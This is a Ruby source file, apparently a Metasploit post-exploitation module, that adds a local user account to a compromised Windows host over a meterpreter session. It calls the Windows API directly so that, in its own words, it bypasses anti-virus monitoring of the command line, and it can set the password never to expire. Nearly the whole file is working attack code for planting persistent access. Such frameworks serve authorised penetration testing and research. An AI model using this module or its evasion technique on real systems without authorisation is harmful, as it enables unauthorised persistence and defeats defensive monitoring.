##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::Windows::Accounts

  def initialize(info={})
    super( update_info( info,
      'Name'          => 'Windows Manage Local User Account Addition',
      'Description'   => %q{
        This module adds a local user account to the specified server with windows api,
        or the local machine if no server is given.
        Because anti-virus software monitors the command line,  using Windows API can bypass anti-virus software to some extent.
      },
      'License'       => MSF_LICENSE,
      'Author'        =>
      [
        'Chris Lennert',  # First author
        'Kali-Team'
      ],
      'Platform'      => [ 'win' ],
      'SessionTypes'  => [ 'meterpreter' ],
      'References'    =>
      [
        [ 'URL', 'https://github.com/rapid7/metasploit-framework/pull/680' ],
        [ 'URL', 'https://docs.microsoft.com/en-us/windows/win32/netmgmt/creating-a-local-group-and-adding-a-user' ]
      ]
    ))

    register_options(
      [
        OptString.new('USERNAME',        [ true,  'The username of the user to add (not-qualified, e.g. BOB)' ]),
        OptString.new('PASSWORD',        [ false, 'The password of the user account to be created' ]),
        OptString.new('SERVER_NAME',     [ false, 'DNS or NetBIOS name of remote server on which to add user' ]),
        OptBool.new(  'DONT_EXPIRE_PWD', [ false, 'Set to true to toggle the "Password never expires" flag on account', false ]),
      ])
  end

  #
  # InitializeUnicodeStr(&uStr,L"string");
  #
  def alloc_and_write_str(value)
    if value == nil
    return 0
    else
    data = client.railgun.util.str_to_uni_z(value)
    result = client.railgun.kernel32.VirtualAlloc(nil, data.length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)
    if result['return'].nil?
      print_error "Failed to allocate memory on the host."
      return nil
    end
    addr = result['return']
    if client.railgun.memwrite(addr, data, data.length)
      return addr
    else
      print_error "Failed to write to memory on the host."
      return nil
    end
    end
  end

  def run
    addr_username    = alloc_and_write_str(datastore['USERNAME'])
    addr_password     = alloc_and_write_str(datastore['PASSWORD'])
    dont_expire_pwd = datastore['DONT_EXPIRE_PWD']

    if addr_username.nil? || addr_password.nil?
      return nil
    end

    acct_flags = 'UF_SCRIPT | UF_NORMAL_ACCOUNT'
    if dont_expire_pwd
      acct_flags << ' | UF_DONT_EXPIRE_PASSWD'
    end

    #  Set up the USER_INFO_1 structure.
    #  https://docs.microsoft.com/en-us/windows/win32/api/Lmaccess/ns-lmaccess-user_info_1
    user_info = [
      addr_username,
      addr_password,
      0x0,
      0x1,
      0x0,
      0x0,
      client.railgun.const(acct_flags),
      0x0
    ].pack("VVVVVVVV")

    #  Netlocalgroupadd work, I tried to call NetLocalGroupAddMembers, but that didn't work either...
    #  I don't know what happened!

    # localgroup_info = [ #  LOCALGROUP_INFO_1
    # 	addr_localgroup, #  lgrpi1_name
    # 	0x0 #  lgrpi1_comment
    # ].pack("VV")

    # localgroup_members = [ #  LOCALGROUP_MEMBERS_INFO_3
    # 	addr_username, #  lgrmi3_domainandname
    # ].pack("V")

    # add_localgroup(datastore['SERVER_NAME'], localgroup_info)
    # add_members_localgroup(datastore['SERVER_NAME'], datastore['LOCALGROUP'], localgroup_members)

    add_user_result = add_user(datastore['SERVER_NAME'], user_info)
    case add_user_result
    when :success
      print_good 'User was added!'
    when :user_exists
      print_error 'User already exists.'
    when :group_exists
      print_error 'Group already exists.'
    when :access_denied
      print_error 'Sorry, you do not have permission to add that user.'
    when :invalid_server
      print_error 'The server you specified was invalid.'
    when :not_on_primary
      print_error 'You must be on the primary domain controller to do that.'
    when :invalid_password
      print_error 'The password does not appear to be valid (too short, too long, too recent, etc.).'
    when nil
      print_error 'Something horrible just happened. Sorry.'
    else
      print_error 'This module is out of date.'
    end
  end
end
